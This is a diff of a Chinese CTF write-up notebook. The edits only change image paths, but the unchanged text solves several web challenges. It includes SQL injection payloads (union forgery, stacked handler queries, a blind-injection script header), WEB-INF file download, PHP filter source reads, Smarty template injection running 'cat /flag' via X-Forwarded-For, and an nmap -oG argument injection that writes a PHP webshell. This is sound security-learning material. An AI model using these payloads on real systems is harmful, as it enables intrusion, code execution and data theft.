@@ -1,6 +1,6 @@
 #  [GXYCTF2019]BabySQli
 sql注入，先随便输一个，返回密码错误，但是发现源码中有一段加密字符
-![[file-20251223124539623.png]]
+![[assets/Day 5/file-20251223124539623.png]]
 base32+base64解密：
 ```sql
 select * from user where username = '$name'
@@ -33,8 +33,8 @@ if($arr[1] == "admin"){
 }
 
    ```
-3. 然后我们可以通过union注入去注出三个回显位哪个是`username`，发现是第二个![[file-20251223132656505.png]]
-4. 然后在利用union查询的特性，我们可以伪造查询结果，就拿我自己的数据库举例![[file-20251223133050855.png]]
+3. 然后我们可以通过union注入去注出三个回显位哪个是`username`，发现是第二个![[assets/Day 5/file-20251223132656505.png]]
+4. 然后在利用union查询的特性，我们可以伪造查询结果，就拿我自己的数据库举例![[assets/Day 5/file-20251223133050855.png]]
    这里就是我们伪造了最后一条记录上去了，同样这里题目我们也可以伪造一条admin账户的查询结果，混淆正确密码，但是这个md5加密一下我是真的想不到，不过也算是契合实际吧，算是经验了。
 5. payload：
 ```http
@@ -79,23 +79,23 @@ handler '表名' close；  --释放空间
 ```http
 ?inject=1'show+tables;--+
 ```
-![[file-20251223140522438.png]]
+![[assets/Day 5/file-20251223140522438.png]]
 这里就确定了表名，接下来就用hadler直接查询:
 ```http
 ?inject=1';handler+FlagHere+open+as+a;handler+a+read+first--+
 ```
-![[file-20251223140422361.png]]
+![[assets/Day 5/file-20251223140422361.png]]
 # [RoarCTF 2019]Easy Java
 进去是登录框，查看源码发现一个路由，疑似文件读取
 `Download?filename=help.docx`
-![[file-20251223141554696.png]]
+![[assets/Day 5/file-20251223141554696.png]]
 每台接触过java题，所以不知道该怎么做，所以看wp了。[WEB-INF文件夹利用](../安全学习/Java安全/WEB-INF文件夹利用.md)
 （这里说要改为post传参才能下载文件，不知道为什么？）
 我们先看一下`web.xml`
-![[file-20251223143401975.png]]
+![[assets/Day 5/file-20251223143401975.png]]
 找到疑似和flag有关的文件`FlagController`
 然后就去看一下对应的class文件
-发现一段base64加密，![[file-20251223143714532.png]]
+发现一段base64加密，![[assets/Day 5/file-20251223143714532.png]]
 解码得到flag（也可以去反编译一下）
 ```java
 //
@@ -133,8 +133,8 @@ public class FlagController extends HttpServlet {
 id = 0^((substr((select(flag)from(flag)),1,1))='f')
 ```
 已经可以看出差别了，那就上脚本，这里不知道是我脚本有问题还是环境有问题，总是跑到一半就开始乱码或者停止，可能是一些网络问题，怎么改脚本也没用，我这里选择分批获取flag，先跑一半，再跑一半
-![[file-20251223183806855.png]]
-![[file-20251223183857937.png]]
+![[assets/Day 5/file-20251223183806855.png]]
+![[assets/Day 5/file-20251223183857937.png]]
 exp：
 ```python
 import requests
@@ -203,9 +203,9 @@ print(f"\n\n[SUCCESS] Final Flag: {flag}")
 
 # [BSidesCF 2020]Had a bad day
 首先抓两个按钮的包，发现就是一个参数`category`
-![[file-20251223194640509.png]]
+![[assets/Day 5/file-20251223194640509.png]]
 我们尝试更改看看是不是sql注入之类的：
-![[file-20251223194819145.png]]
+![[assets/Day 5/file-20251223194819145.png]]
 从报错信息很容易得到，会`include`包含我们的参数，并且最后会自动加上`.php`后缀。所以我们尝试用`php伪协议`读取源码，
 ```http
 ?category=php://filter/read=convert.base64-encode/resource=index
@@ -248,13 +248,13 @@ base64解码后得到源代码：
 进去是一个博客，存在`flag.php`页面会显示ip
 `hint.php`页面提示为什么会知道IP
 猜测`xff`头注入，测试sql,但是输入什么都原样返回，考虑ssti了
-![[file-20251223213912252.png]]
+![[assets/Day 5/file-20251223213912252.png]]
 实锤ssti，这里php的ssti没学过，去学习一下。
 我们通过`{$smarty.version}`判断是否是smarty模板
-![[file-20251223214310946.png]]
+![[assets/Day 5/file-20251223214310946.png]]
 确定是smarty了，老版本smarty模板允许直接在if标签中执行php代码
 我们这里可以直接执行系统命令
-![[file-20251223214603177.png]]
+![[assets/Day 5/file-20251223214603177.png]]
 payload:
 ```http
 X-Forwarded-For: {if system('cat /flag')}{/if}
@@ -262,12 +262,12 @@ X-Forwarded-For: {if system('cat /flag')}{/if}
 # [CISCN2019 华东南赛区]Web11
 既然学到了smarty模板注入，那就趁热打铁在练一下吧
 同样是php网站，可以获取我的ip，而且还一个很明显的`Build With Smarty !`
-![[file-20251223220533553.png]]
+![[assets/Day 5/file-20251223220533553.png]]
 可以很确定也是smarty的模板注入
 在测试一下xff头，果然根据xff判断ip，并且可以解析smarty语法
-![[file-20251223220755819.png]]
+![[assets/Day 5/file-20251223220755819.png]]
 我们开始利用，直接尝试命令执行吧
-![[file-20251223221010982.png]]
+![[assets/Day 5/file-20251223221010982.png]]
 可以看到也是可以直接利用的。
 
 # [BJDCTF2020]ZJCTF，不过如此
@@ -383,4 +383,4 @@ if(!isset($_GET['host'])) {
 ?host=' <?=eval($_POST[1]);?> -oG shell.php '
 ```
 这里用-oG参数写入木马，但是注意这里是在沙箱中写的，我们要注意一下目录
-![[file-20251223233239029.png]]
+![[assets/Day 5/file-20251223233239029.png]]
